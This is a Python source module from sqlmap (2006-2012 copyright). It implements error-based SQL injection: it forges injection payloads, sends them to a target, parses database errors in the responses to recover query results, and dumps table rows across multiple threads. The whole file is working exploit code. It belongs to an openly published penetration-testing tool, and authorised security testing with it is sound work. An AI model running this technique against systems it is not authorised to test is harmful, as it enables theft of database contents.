#!/usr/bin/env python

"""
$Id$

Copyright (c) 2006-2012 sqlmap developers (http://www.sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.bigarray import BigArray
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import extractRegexResult
from lib.core.common import getUnicode
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import incrementCounter
from lib.core.common import initTechnique
from lib.core.common import isNumPosStrValue
from lib.core.common import listToStrValue
from lib.core.common import readInput
from lib.core.convert import htmlunescape
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import PAYLOAD
from lib.core.settings import FROM_DUMMY_TABLE
from lib.core.settings import MYSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import MSSQL_ERROR_CHUNK_LENGTH
from lib.core.settings import SLOW_ORDER_COUNT_THRESHOLD
from lib.core.settings import SQL_SCALAR_REGEX
from lib.core.settings import TURN_OFF_RESUME_INFO_LIMIT
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request

def __oneShotErrorUse(expression, field):
    retVal = hashDBRetrieve(expression)

    threadData = getCurrentThreadData()
    threadData.resumed = retVal is not None

    offset = 1
    chunk_length = None

    if retVal is None:
        while True:
            check = "%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
            trimcheck = "%s(?P<result>.*?)</" % (kb.chars.start)

            nulledCastedField = agent.nullAndCastField(field)

            if Backend.isDbms(DBMS.MYSQL):
                chunk_length = MYSQL_ERROR_CHUNK_LENGTH
                nulledCastedField = queries[DBMS.MYSQL].substring.query % (nulledCastedField, offset, chunk_length)
            elif Backend.isDbms(DBMS.MSSQL):
                chunk_length = MSSQL_ERROR_CHUNK_LENGTH
                nulledCastedField = queries[DBMS.MSSQL].substring.query % (nulledCastedField, offset, chunk_length)

            # Forge the error-based SQL injection request
            vector = kb.injection.data[PAYLOAD.TECHNIQUE.ERROR].vector
            query = agent.prefixQuery(vector)
            query = agent.suffixQuery(query)
            injExpression = expression.replace(field, nulledCastedField, 1)
            injExpression = unescaper.unescape(injExpression)
            injExpression = query.replace("[QUERY]", injExpression)
            payload = agent.payload(newValue=injExpression)

            # Perform the request
            page, headers = Request.queryPage(payload, content=True)

            incrementCounter(PAYLOAD.TECHNIQUE.ERROR)

            # Parse the returned page to get the exact error-based
            # sql injection output
            output = reduce(lambda x, y: x if x is not None else y, [ \
                    extractRegexResult(check, page, re.DOTALL | re.IGNORECASE), \
                    extractRegexResult(check, listToStrValue(headers.headers \
                    if headers else None), re.DOTALL | re.IGNORECASE), \
                    extractRegexResult(check, threadData.lastRedirectMsg[1] \
                    if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                    threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)], \
                    None)

            if output is not None:
                output = getUnicode(output, kb.pageEncoding)
            else:
                trimmed = extractRegexResult(trimcheck, page, re.DOTALL | re.IGNORECASE) \
                    or extractRegexResult(trimcheck, listToStrValue(headers.headers \
                    if headers else None), re.DOTALL | re.IGNORECASE) \
                    or extractRegexResult(trimcheck, threadData.lastRedirectMsg[1] \
                    if threadData.lastRedirectMsg and threadData.lastRedirectMsg[0] == \
                    threadData.lastRequestUID else None, re.DOTALL | re.IGNORECASE)

                if trimmed:
                    warnMsg = "possible server trimmed output detected (due to its length): "
                    warnMsg += trimmed
                    logger.warn(warnMsg)

            if any(map(lambda dbms: Backend.isDbms(dbms), [DBMS.MYSQL, DBMS.MSSQL])):
                if offset == 1:
                    retVal = output
                else:
                    retVal += output if output else ''

                if output and len(output) >= chunk_length:
                    offset += chunk_length
                else:
                    break
            else:
                retVal = output
                break

        retVal = decodeHexValue(retVal) if conf.hexConvert else retVal

        if isinstance(retVal, basestring):
            retVal = htmlunescape(retVal).replace("<br>", "\n")

        retVal = __errorReplaceChars(retVal)

        hashDBWrite(expression, retVal)

    else:
        _ = "%s(?P<result>.*?)%s" % (kb.chars.start, kb.chars.stop)
        retVal = extractRegexResult(_, retVal, re.DOTALL | re.IGNORECASE) or retVal

    return safecharencode(retVal) if kb.safeCharEncode else retVal

def __errorFields(expression, expressionFields, expressionFieldsList, expected=None, num=None):
    outputs = []
    origExpr = None

    threadData = getCurrentThreadData()

    for field in expressionFieldsList:
        output = None

        if field.startswith("ROWNUM "):
            continue

        if isinstance(num, int):
            origExpr = expression
            expression = agent.limitQuery(num, expression, field, expressionFieldsList[0])

        if "ROWNUM" in expressionFieldsList:
            expressionReplaced = expression
        else:
            expressionReplaced = expression.replace(expressionFields, field, 1)

        output = __oneShotErrorUse(expressionReplaced, field)

        if not kb.threadContinue:
            return None

        if output is not None:
            dataToStdout("[%s] [INFO] %s: %s\r\n" % (time.strftime("%X"), "resumed" if threadData.resumed else "retrieved", safecharencode(output)))

        if isinstance(num, int):
            expression = origExpr

        outputs.append(output)

    return outputs

def __errorReplaceChars(value):
    """
    Restores safely replaced characters
    """

    retVal = value

    if value:
        retVal = retVal.replace(kb.chars.space, " ").replace(kb.chars.dollar, "$").replace(kb.chars.at, "@")

    return retVal

def errorUse(expression, expected=None, dump=False):
    """
    Retrieve the output of a SQL query taking advantage of the error-based
    SQL injection vulnerability on the affected parameter.
    """

    initTechnique(PAYLOAD.TECHNIQUE.ERROR)

    abortedFlag = False
    count = None
    start = time.time()
    startLimit = 0
    stopLimit = None
    output = None
    outputs = None
    untilLimitChar = None

    _, _, _, _, _, expressionFieldsList, expressionFields, _ = agent.getFields(expression)

    # We have to check if the SQL query might return multiple entries
    # and in such case forge the SQL limiting the query output one
    # entry per time
    # NOTE: I assume that only queries that get data from a table can
    # return multiple entries
    if (dump and (conf.limitStart or conf.limitStop)) or (" FROM " in \
       expression.upper() and ((Backend.getIdentifiedDbms() not in FROM_DUMMY_TABLE) \
       or (Backend.getIdentifiedDbms() in FROM_DUMMY_TABLE and not \
       expression.upper().endswith(FROM_DUMMY_TABLE[Backend.getIdentifiedDbms()]))) \
       and ("(CASE" not in expression.upper() or ("(CASE" in expression.upper() and "WHEN use" in expression))) \
       and not re.search(SQL_SCALAR_REGEX, expression, re.I):

        limitRegExp = re.search(queries[Backend.getIdentifiedDbms()].limitregexp.query, expression, re.I)
        topLimit = re.search("TOP\s+([\d]+)\s+", expression, re.I)

        if limitRegExp or (Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE) and topLimit):
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                if limitGroupStart.isdigit():
                    startLimit = int(limitRegExp.group(int(limitGroupStart)))

                stopLimit = limitRegExp.group(int(limitGroupStop))
                limitCond = int(stopLimit) > 1

            elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                if limitRegExp:
                    limitGroupStart = queries[Backend.getIdentifiedDbms()].limitgroupstart.query
                    limitGroupStop = queries[Backend.getIdentifiedDbms()].limitgroupstop.query

                    if limitGroupStart.isdigit():
                        startLimit = int(limitRegExp.group(int(limitGroupStart)))

                    stopLimit = limitRegExp.group(int(limitGroupStop))
                    limitCond = int(stopLimit) > 1
                elif topLimit:
                    startLimit = 0
                    stopLimit = int(topLimit.group(1))
                    limitCond = int(stopLimit) > 1

            elif Backend.isDbms(DBMS.ORACLE):
                limitCond = False
        else:
            limitCond = True

        # I assume that only queries NOT containing a "LIMIT #, 1"
        # (or similar depending on the back-end DBMS) can return
        # multiple entries
        if limitCond:
            if limitRegExp:
                stopLimit = int(stopLimit)

                # From now on we need only the expression until the " LIMIT "
                # (or similar, depending on the back-end DBMS) word
                if Backend.getIdentifiedDbms() in (DBMS.MYSQL, DBMS.PGSQL):
                    stopLimit += startLimit
                    untilLimitChar = expression.index(queries[Backend.getIdentifiedDbms()].limitstring.query)
                    expression = expression[:untilLimitChar]

                elif Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.SYBASE):
                    stopLimit += startLimit
            elif dump:
                if conf.limitStart:
                    startLimit = conf.limitStart - 1
                if conf.limitStop:
                    stopLimit = conf.limitStop

            # Count the number of SQL query entries output
            countedExpression = expression.replace(expressionFields, queries[Backend.getIdentifiedDbms()].count.query % '*', 1)

            if " ORDER BY " in expression:
                countedExpression = countedExpression[:countedExpression.index(" ORDER BY ")]

            _, _, _, _, _, _, countedExpressionFields, _ = agent.getFields(countedExpression)
            count = __oneShotErrorUse(countedExpression, countedExpressionFields)

            if isNumPosStrValue(count):
                if isinstance(stopLimit, int) and stopLimit > 0:
                    stopLimit = min(int(count), int(stopLimit))
                else:
                    stopLimit = int(count)

                    infoMsg = "the SQL query used returns "
                    infoMsg += "%d entries" % stopLimit
                    logger.info(infoMsg)

            elif count and not count.isdigit():
                warnMsg = "it was not possible to count the number "
                warnMsg += "of entries for the SQL query provided. "
                warnMsg += "sqlmap will assume that it returns only "
                warnMsg += "one entry"
                logger.warn(warnMsg)

                stopLimit = 1

            elif (not count or int(count) == 0):
                if not count:
                    warnMsg = "the SQL query provided does not "
                    warnMsg += "return any output"
                    logger.warn(warnMsg)

                return outputs

            if " ORDER BY " in expression and (stopLimit - startLimit) > SLOW_ORDER_COUNT_THRESHOLD:
                message = "due to huge table size do you want to remove "
                message += "ORDER BY clause gaining speed over consistency? [y/N] "
                output = readInput(message, default="N")

                if output and output[0] in ("y", "Y"):
                    expression = expression[:expression.index(" ORDER BY ")]

            threadData = getCurrentThreadData()
            threadData.shared.limits = iter(xrange(startLimit, stopLimit))
            numThreads = min(conf.threads, (stopLimit - startLimit))
            threadData.shared.outputs = BigArray()

            if stopLimit > TURN_OFF_RESUME_INFO_LIMIT:
                kb.suppressResumeInfo = True
                debugMsg = "suppressing possible resume console info because of "
                debugMsg += "large number of rows. It might take too long"
                logger.debug(debugMsg)

            try:
                def errorThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        kb.locks.limits.acquire()
                        try:
                            num = threadData.shared.limits.next()
                        except StopIteration:
                            break
                        finally:
                            kb.locks.limits.release()

                        output = __errorFields(expression, expressionFields, expressionFieldsList, expected, num)

                        if not kb.threadContinue:
                            break

                        if output and isinstance(output, list) and len(output) == 1:
                            output = output[0]

                        kb.locks.outputs.acquire()
                        threadData.shared.outputs.append(output)
                        kb.locks.outputs.release()

                runThreads(numThreads, errorThread)

            except KeyboardInterrupt:
                abortedFlag = True
                warnMsg = "user aborted during enumeration. sqlmap "
                warnMsg += "will display partial output"
                logger.warn(warnMsg)

            finally:
                outputs = threadData.shared.outputs
                kb.suppressResumeInfo = False

    if not outputs and not abortedFlag:
        outputs = __errorFields(expression, expressionFields, expressionFieldsList)

    if outputs and isinstance(outputs, list) and len(outputs) == 1 and isinstance(outputs[0], basestring):
        outputs = outputs[0]

    duration = calculateDeltaSeconds(start)

    if not kb.bruteMode:
        debugMsg = "performed %d queries in %d seconds" % (kb.counters[PAYLOAD.TECHNIQUE.ERROR], duration)
        logger.debug(debugMsg)

    return outputs
